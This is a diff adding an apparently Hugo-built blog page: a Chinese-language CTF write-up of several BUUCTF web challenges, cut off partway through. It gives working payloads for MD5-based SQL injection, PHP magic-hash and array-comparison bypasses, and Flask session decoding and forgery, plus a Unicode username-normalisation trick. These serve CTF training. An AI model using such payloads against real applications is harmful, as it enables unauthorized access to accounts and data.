@@ -1,0 +1,887 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <title>BUUCTF WEB 1 :: FanBig&#39;s Blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content="BUUCTF WEB 1 [BJDCTF2020]Easy MD5 response包中有Hint提示
+HTTP/1.1 200 OK Server: openresty Date: Wed, 31 Jan 2024 04:19:31 GMT Content-Type: text/html; charset=UTF-8 Connection: close Vary: Accept-Encoding Hint: select * from &amp;#39;admin&amp;#39; where password=md5($pass,true) X-Powered-By: PHP/7.3.13 Cache-Control: no-cache Content-Length: 3107 可以知道是利用md5($pass,true)这个函数构造出sql注入的payload进行利用，即
+select * from &amp;#39;admin&amp;#39; where password=md5($pass,true) select * from &amp;#39;admin&amp;#39; where password=&amp;#39;or&amp;#39;1 所有需要应该字符串来构造相应的payload，如ffifdyop ，对应的MD5为0x276f722736c95d99e921722cf9ed621c，这个是16进制的，由于MySQL默认把16进制转成ASCII，所以会变成&#39;or&#39;6É]é!r,ùíb，满足上述开头，接着来到第二个页面
+&amp;lt;!-- $a = $GET[&amp;#39;a&amp;#39;]; $b = $_GET[&amp;#39;b&amp;#39;]; if($a != $b &amp;amp;&amp;amp; md5($a) == md5($b)){ // wow, glzjin wants a girl friend."
+/>
+<meta
+  name="keywords"
+  content=""
+/>
+<meta name="robots" content="noodp" />
+<meta property="og:title" content="BUUCTF WEB 1" />
+<meta property="og:description" content="BUUCTF WEB" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="//localhost:1313/posts/buuctf-web-1/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-03-13T13:13:40+08:00" />
+<meta property="article:modified_time" content="2024-03-13T13:13:40+08:00" />
+
+
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="BUUCTF WEB 1"/>
+<meta name="twitter:description" content="BUUCTF WEB"/>
+
+
+<link rel="canonical" href="//localhost:1313/posts/buuctf-web-1/" />
+
+<link rel="shortcut icon" href="/favicon.ico" />
+<link rel="stylesheet" href="/css/index.990d326724754f27d5d9e8d3b865873e6b1c3f7e92dcc20f80375591db4b9835.css">
+
+
+
+
+
+
+
+
+
+  
+</head>
+<body class="flex flex-col min-h-screen w-full bg-slate-50 dark:bg-gray-800">
+  <header class="flex flex-none justify-center z-10">
+    <div class="flex flex-row gap justify-between w-full max-w-4xl lg:max-w-5xl h-12 mt-3">
+  <div class="flex-none ml-2 md:ml-0">
+    <a href="/" class="">
+      <img class="h-12 w-12 rounded-full object-cover bg-gray-100" src="/images/1.jpg" alt="logo">
+    </a>
+  </div>
+  <div class="flex-1"></div>
+  <div class="flex-none">
+    
+
+
+
+<nav class="h-full static">
+  <button id="navbar-menu-toggle" type="button" class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg md:hidden" aria-controls="navbar-menu" aria-expanded="false">
+    <span class="sr-only">Open main menu</span>
+    <i class="w-8 h-8">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-menu-2" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 6l16 0" />
+  <path d="M4 12l16 0" />
+  <path d="M4 18l16 0" />
+</svg>
+
+    </i>
+  </button>
+  <div class="absolute md:static top-16 left-0 right-0 z-50 hidden w-full md:block md:w-auto" id="navbar-menu">
+    <ul class="flex flex-col mx-2 md:mx-0 md:flex-row md:border-0 rounded-sm md:rounded-full px-3 text-base font-medium text-slate-800 dark:text-slate-200 shadow-lg bg-white dark:bg-gray-600 shadow-slate-800/5 dark:shadow-slate-200/5 ring-1 ring-slate-900/5 dark:ring-slate-100/5">
+    
+        <li id="about" class="">
+          <a class="block px-3 py-3 hover:text-emerald-600"
+            href="/about/" title="About">About</a>
+        </li>
+      
+    
+        <li id="post" class="">
+          <a class="block px-3 py-3 hover:text-emerald-600 text-emerald-600"
+            href="/posts/" title="Post">Post</a>
+        </li>
+      
+    
+    </ul>
+  </div>
+</nav>
+
+
+  </div>
+  
+  <div class="flex-none mx-1"></div>
+  
+  <div class="flex-none md:hidden">
+    <a href=/search/ class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg" aria-controls="navbar-menu" aria-expanded="false">
+      <span class="sr-only">Search</span>
+      <i class="w-8 h-8">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+    <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+    <path d="M10 10m-7 0a7 7 0 1 0 14 0a7 7 0 1 0 -14 0" />
+    <path d="M21 21l-6 -6" />
+</svg>
+
+      </i>
+    </a>
+  </div>
+  <div class="darkmode-toggle flex flex-none mr-2 md:mr-0">
+    <label for="darkmode-toggle" class="flex items-center px-3 cursor-pointer rounded-full bg-gray-100 dark:bg-gray-600" title="Toggle dark mode">
+      <input name="darkmode-toggle" id="darkmode-toggle" type="checkbox" class="sr-only peer" aria-label="Toggle dark mode">
+      <div class="group flex flex-row gap-1 justify-center h-8 px-1 rounded-full bg-white dark:bg-gray-700">
+        <i class="h-6 w-6 flex-none rounded-full bg-yellow-400 place-self-center peer-checked:group-[]:invisible">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brightness-down" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M12 12m-3 0a3 3 0 1 0 6 0a3 3 0 1 0 -6 0"></path>
+   <path d="M12 5l0 .01"></path>
+   <path d="M17 7l0 .01"></path>
+   <path d="M19 12l0 .01"></path>
+   <path d="M17 17l0 .01"></path>
+   <path d="M12 19l0 .01"></path>
+   <path d="M7 17l0 .01"></path>
+   <path d="M5 12l0 .01"></path>
+   <path d="M7 7l0 .01"></path>
+</svg>
+
+        </i>
+        <i class="h-6 w-6 flex-none rounded-full place-self-center invisible peer-checked:group-[]:visible">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-moon-stars" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z"></path>
+   <path d="M17 4a2 2 0 0 0 2 2a2 2 0 0 0 -2 2a2 2 0 0 0 -2 -2a2 2 0 0 0 2 -2"></path>
+   <path d="M19 11h2m-1 -1v2"></path>
+</svg>
+
+        </i>
+      </div>
+    </label>
+  </div>
+</div>
+
+  </header>
+  <main class="flex flex-auto justify-center">
+    
+<div class="w-full max-w-4xl lg:max-w-5xl">
+  <div class="flex flex-col gap-y-3 p-6 mt-6 mx-2 md:mx-0 rounded-lg shadow-md bg-white dark:bg-gray-700">
+    <h1 class="text-4xl font-semibold text-slate-800 dark:text-slate-100">
+      <a href="/posts/buuctf-web-1/">BUUCTF WEB 1</a>
+    </h1>
+
+    
+    <h2 class="my-4 text-large text-slate-600 dark:text-slate-300">
+      BUUCTF WEB
+    </h2>
+    
+    
+  <ul class="flex flex-row flex-wrap text-slate-500 dark:text-slate-300">
+    
+      
+      <li>
+        <a href="/categories/ctf/"
+          class="text-sm mr-2 px-2 py-1 rounded border border-emerald-800 bg-emerald-800 text-slate-50">
+          CTF
+        </a>
+      </li>
+      
+    
+    
+      
+      <li>
+        <a href="/tags/web/"
+          class="flex flex-row text-sm mr-2 py-1">
+          <i class="h-5 w-5 flex-none">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-tags" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M3 8v4.172a2 2 0 0 0 .586 1.414l5.71 5.71a2.41 2.41 0 0 0 3.408 0l3.592 -3.592a2.41 2.41 0 0 0 0 -3.408l-5.71 -5.71a2 2 0 0 0 -1.414 -.586h-4.172a2 2 0 0 0 -2 2z"></path>
+   <path d="M18 19l1.592 -1.592a4.82 4.82 0 0 0 0 -6.816l-4.592 -4.592"></path>
+   <path d="M7 10h-.01"></path>
+</svg>
+
+          </i>
+          <span class="ml-0">WEB</span>
+        </a>
+      </li>
+      
+    
+  </ul>
+
+
+
+    <div class="flex flex-col gap-y-1 md:flex-row md:gap-y-0 md:gap-x-4 text-slate-500 dark:text-slate-300">
+  
+  
+  <div class="flex flex-row text-base gap-x-1">
+    <i class="h-6 w-6 flex-none">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M4 7a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2v-12z"></path>
+   <path d="M16 3v4"></path>
+   <path d="M8 3v4"></path>
+   <path d="M4 11h16"></path>
+   <path d="M11 15h1"></path>
+   <path d="M12 15v3"></path>
+</svg>
+
+    </i>
+    <time datetime="2024-03-13T13:13:40&#43;08:00">
+      2024-03-13
+    </time>
+  </div>
+
+  <div class="flex flex-row text-base gap-x-1">
+    <i class="h-6 w-6 flex-none">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hourglass-high" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M6.5 7h11"></path>
+   <path d="M6 20v-2a6 6 0 1 1 12 0v2a1 1 0 0 1 -1 1h-10a1 1 0 0 1 -1 -1z"></path>
+   <path d="M6 4v2a6 6 0 1 0 12 0v-2a1 1 0 0 0 -1 -1h-10a1 1 0 0 0 -1 1z"></path>
+</svg>
+
+    </i>
+    <span>
+      6 minutes to read
+    </span>
+  </div>
+</div>
+
+
+    
+      
+      <section class="prose prose-slate dark:prose-invert w-full max-w-4xl lg:max-w-5xl mt-6">
+        <h2>Table of Contents</h2>
+        <aside><nav id="TableOfContents">
+  <ul>
+    <li><a href="#bjdctf2020easy-md5">[BJDCTF2020]Easy MD5</a></li>
+    <li><a href="#hctf-2018admin">[HCTF 2018]admin</a>
+      <ul>
+        <li><a href="#思路一弱口令">思路一：弱口令</a></li>
+        <li><a href="#思路二flask-session伪造">思路二：Flask Session伪造</a></li>
+        <li><a href="#思路三unicode欺骗">思路三：Unicode欺骗</a></li>
+      </ul>
+    </li>
+    <li><a href="#mrctf2020你传你呢">[MRCTF2020]你传你🐎呢</a></li>
+    <li><a href="#护网杯-2018easy_tornado">[护网杯 2018]easy_tornado</a></li>
+    <li><a href="#zjctf-2019nizhuansiwei">[ZJCTF 2019]NiZhuanSiWei</a></li>
+    <li><a href="#极客大挑战-2019hardsql">[极客大挑战 2019]HardSQL</a></li>
+    <li><a href="#mrctf2020ez_bypass">[MRCTF2020]Ez_bypass</a></li>
+    <li><a href="#网鼎杯-2020-青龙组areuserialz">[网鼎杯 2020 青龙组]AreUSerialz</a></li>
+    <li><a href="#gxyctf2019babyupload">[GXYCTF2019]BabyUpload</a></li>
+    <li><a href="#suctf-2019checkin">[SUCTF 2019]CheckIn</a></li>
+    <li><a href="#gxyctf2019babysqli">[GXYCTF2019]BabySQli</a></li>
+  </ul>
+</nav></aside>
+      </section>
+      
+    
+
+    <article class="mt-6 w-full max-w-4xl lg:max-w-5xl prose prose-slate dark:prose-invert prose-quoteless post-content">
+      <h1 id="buuctf-web-1">BUUCTF WEB 1</h1>
+<h2 id="bjdctf2020easy-md5">[BJDCTF2020]Easy MD5</h2>
+<p>response包中有Hint提示</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#ae81ff">HTTP/1.1 200 OK</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Server</span>: <span style="color:#ae81ff">openresty</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Date</span>: <span style="color:#ae81ff">Wed, 31 Jan 2024 04:19:31 GMT</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Content-Type</span>: <span style="color:#ae81ff">text/html; charset=UTF-8</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Connection</span>: <span style="color:#ae81ff">close</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Vary</span>: <span style="color:#ae81ff">Accept-Encoding</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Hint</span>: <span style="color:#ae81ff">select * from &#39;admin&#39; where password=md5($pass,true)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">X-Powered-By</span>: <span style="color:#ae81ff">PHP/7.3.13</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Cache-Control</span>: <span style="color:#66d9ef">no</span>-<span style="color:#ae81ff">cache</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Content-Length</span>: <span style="color:#ae81ff">3107</span>
+</span></span></code></pre></div><p>可以知道是利用md5($pass,true)这个函数构造出sql注入的payload进行利用，即</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> <span style="color:#e6db74">&#39;admin&#39;</span> <span style="color:#66d9ef">where</span> password<span style="color:#f92672">=</span>md5(<span style="color:#960050;background-color:#1e0010">$</span>pass,<span style="color:#66d9ef">true</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> <span style="color:#e6db74">&#39;admin&#39;</span> <span style="color:#66d9ef">where</span> password<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;or&#39;</span><span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>所有需要应该字符串来构造相应的payload，如<code>ffifdyop</code> ，对应的MD5为<code>0x276f722736c95d99e921722cf9ed621c</code>，这个是16进制的，由于MySQL默认把16进制转成ASCII，所以会变成<code>'or'6É]é!r,ùíb</code>，满足上述开头，接着来到第二个页面</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;!--</span>
+</span></span><span style="display:flex;"><span>$a <span style="color:#f92672">=</span> $GET[<span style="color:#e6db74">&#39;a&#39;</span>];
+</span></span><span style="display:flex;"><span>$b <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;b&#39;</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>($a <span style="color:#f92672">!=</span> $b <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">md5</span>($a) <span style="color:#f92672">==</span> <span style="color:#a6e22e">md5</span>($b)){
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// wow, glzjin wants a girl friend.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">--&gt;</span>
+</span></span></code></pre></div><p>PHP在处理哈希字符串时，它把每一个以“0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0E”开头的，PHP会当作科学计数法来处理，也就是0的n次方，得到的值比较的时候都相同。只有是弱比较才能用！！！</p>
+<pre tabindex="0"><code>以下值在md5加密后以0E开头：
+
+QNKCDZO
+240610708
+s878926199a
+s155964671a
+s214587387a
+s214587387a
+</code></pre><p>下一关</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#34;flag.php&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>($_POST[<span style="color:#e6db74">&#39;param1&#39;</span>]<span style="color:#f92672">!==</span>$_POST[<span style="color:#e6db74">&#39;param2&#39;</span>]<span style="color:#f92672">&amp;&amp;</span><span style="color:#a6e22e">md5</span>($_POST[<span style="color:#e6db74">&#39;param1&#39;</span>])<span style="color:#f92672">===</span><span style="color:#a6e22e">md5</span>($_POST[<span style="color:#e6db74">&#39;param2&#39;</span>]))
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> $flag;
+</span></span><span style="display:flex;"><span>} 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>php的md5()无法处理数组，结果返回为NULL，所以使用数组绕过就行</p>
+<pre tabindex="0"><code>param1[]=111&amp;param2[]=222
+</code></pre><h2 id="hctf-2018admin">[HCTF 2018]admin</h2>
+<h3 id="思路一弱口令">思路一：弱口令</h3>
+<h3 id="思路二flask-session伪造">思路二：Flask Session伪造</h3>
+<p>注册登录后，在change页面找到源码网址</p>
+<pre tabindex="0"><code>https://github.com/woadsl1234/hctf_flask/
+</code></pre><p>访问拿到源码，并且发现是flask网站，抓包也有flask session</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#ae81ff">POST /login HTTP/1.1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Host</span>: <span style="color:#ae81ff">fb32d279-c5b3-4f60-8889-ff92cf77b52d.node5.buuoj.cn:81</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">User-Agent</span>: <span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Accept</span>: <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Accept-Language</span>: <span style="color:#ae81ff">en-US,en;q=0.5</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Accept-Encoding</span>: <span style="color:#ae81ff">gzip, deflate</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Content-Type</span>: <span style="color:#ae81ff">multipart/form-data; boundary=---------------------------3987393260628375106622242395</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Content-Length</span>: <span style="color:#ae81ff">287</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Origin</span>: <span style="color:#ae81ff">http://fb32d279-c5b3-4f60-8889-ff92cf77b52d.node5.buuoj.cn:81</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Connection</span>: <span style="color:#ae81ff">close</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Referer</span>: <span style="color:#ae81ff">http://fb32d279-c5b3-4f60-8889-ff92cf77b52d.node5.buuoj.cn:81/login</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Cookie</span>: <span style="color:#ae81ff">session=.eJw9j8FqwzAQRH-l6NyD7aSXQA4BOcaGlRDIFruX4NquHdlKoS3IVsi_V7SQ0ywM-2bmzi7Xnh3u7OWdHRhxlRGfN7L9AhZTweeErPKgmwV0FyQ_rcTHTGT5JrkKaGePJk-Al_EHPIZ-ElmZCQ471HWQurIQygQKfJO8WqRRkVHuwKkEdTWBjhpGL-x5Aqv2aDsvHPh4b2TqNGasqBeHBvdU1KvUeQA7rmTUkT1eWff99XH5-ZyH23MCmIgvyKI9z8RhA557WaAnQ45cnKQh1hMWM5UIPsYadYrj8Q93de04PElD05R0-ndurYsGa9njF7f_Yjs.Zbt3cQ.lbiU5iv-IXjUVquN9B9XGZVc9x8</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Upgrade-Insecure-Requests</span>: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-----------------------------<span style="color:#ae81ff">3987393260628375106622242395</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Content-Disposition</span>: <span style="color:#ae81ff">form-data; name=&#34;username&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">a</span>
+</span></span><span style="display:flex;"><span>-----------------------------<span style="color:#ae81ff">3987393260628375106622242395</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">Content-Disposition</span>: <span style="color:#ae81ff">form-data; name=&#34;password&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">a</span>
+</span></span><span style="display:flex;"><span>-----------------------------<span style="color:#ae81ff">3987393260628375106622242395</span>--
+</span></span></code></pre></div><p>利用脚本解码session</p>
+<pre tabindex="0"><code>https://github.com/noraj/flask-session-cookie-manager
+</code></pre><p>上述脚本decode输出结果无法直接就行encode，所以使用以下脚本decode，结果可以直接encode</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> zlib
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> base64 <span style="color:#f92672">import</span> b64decode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask.sessions <span style="color:#f92672">import</span> session_json_serializer
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> itsdangerous <span style="color:#f92672">import</span> base64_decode
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decryption</span>(payload):
+</span></span><span style="display:flex;"><span>    payload, sig <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>rsplit(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;.&#39;</span>, <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    payload, timestamp <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>rsplit(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;.&#39;</span>, <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    decompress <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> payload<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;.&#39;</span>):
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> payload[<span style="color:#ae81ff">1</span>:]
+</span></span><span style="display:flex;"><span>        decompress <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> base64_decode(payload)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">Exception</span>(
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;Could not base64 decode the payload because of an exception&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> decompress:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">=</span> zlib<span style="color:#f92672">.</span>decompress(payload)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">Exception</span>(
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;Could not zlib decompress the payload before decoding the payload&#39;</span>
+</span></span><span style="display:flex;"><span>            )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> session_json_serializer<span style="color:#f92672">.</span>loads(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># print(decryption(sys.argv[1].encode()))</span>
+</span></span><span style="display:flex;"><span>    session <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;.eJw9kEGLwjAQhf_KMmcPbXUvggchtVSYhEBqmFzE1dqaNi5UJW3E_77BBU8z8HjfvDdP2J-H-tbC8j486hnsLydYPuHrB5ZgmMwM6yZjTz1aSjnrEmOlR7XrUR2DYOvRsCbjWT4JJgPZzpPOE2Rl9KCncGp5Vmac4ZxUFYTaWgxlggV9C7bthZaRUc7RyYTUtkUVZ2g8t5sWrVyQPXru0Md9MrpK442RVO9I08IU1ShUHtA2o9FyBa8ZHG_DeX__7errpwLqiC-MJbvpDMMJWe5FQd5o44yLlRTGeNxSJhPOmhijSqlZvXEXd2jqD6ne7Uqz_leuBxcFOMAMHrd6eP8M0gRef9vxa1Y.Zbt_JQ.A8Wr3XzTIQKDpoUd_JP5SKVSBMY&#39;</span>
+</span></span><span style="display:flex;"><span>    print(decryption(session))
+</span></span></code></pre></div><p>解码得到</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#960050;background-color:#1e0010">&#39;_fresh&#39;:</span> <span style="color:#960050;background-color:#1e0010">True,</span> <span style="color:#960050;background-color:#1e0010">&#39;_id&#39;:</span> <span style="color:#960050;background-color:#1e0010">b&#39;d46d92f7e265494f4015e173801d867a2843b90aa4022f30c7a7b6437a5392c3240f982e9d38272d4a2a144c8061a248b706c0242ee5841a9faf8de1913281ed&#39;,</span> <span style="color:#960050;background-color:#1e0010">&#39;csrf_token&#39;:</span> <span style="color:#960050;background-color:#1e0010">b&#39;1b70fcb1dd320108f0effff553643ccd4484a55b&#39;,</span> <span style="color:#960050;background-color:#1e0010">&#39;image&#39;:</span> <span style="color:#960050;background-color:#1e0010">b&#39;yUHd&#39;,</span> <span style="color:#960050;background-color:#1e0010">&#39;name&#39;:</span> <span style="color:#960050;background-color:#1e0010">&#39;a&#39;,</span> <span style="color:#960050;background-color:#1e0010">&#39;user_id&#39;:</span> <span style="color:#960050;background-color:#1e0010">&#39;10&#39;</span>}
+</span></span></code></pre></div><p>构造admin用户session，然后encode，但encode需要密钥，在源码中找一下，找到直接构造</p>
+<h3 id="思路三unicode欺骗">思路三：Unicode欺骗</h3>
+<p>需要进行代码审计，其中有一个函数</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">strlower</span>(username):
+</span></span><span style="display:flex;"><span>    username <span style="color:#f92672">=</span> nodeprep<span style="color:#f92672">.</span>prepare(username)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> username
+</span></span></code></pre></div><p>nodeprep.prepare()这个函数对于特殊字符会做如下处理</p>
+<pre tabindex="0"><code>ᴬ -&gt; A -&gt; a
+</code></pre><p>所以注册一个特殊符号的用户，后端会处理成admin用户，我们修改密码，然后直接登录</p>
+<h2 id="mrctf2020你传你呢">[MRCTF2020]你传你🐎呢</h2>
+<p>简单的文件上传，限制了MIME类型，使用jpg，.htaccess绕过就行</p>
+<h2 id="护网杯-2018easy_tornado">[护网杯 2018]easy_tornado</h2>
+<p>Tornado render()函数 STTI，hint提示cookie_secret，从而得知必须要知道cookie_secret</p>
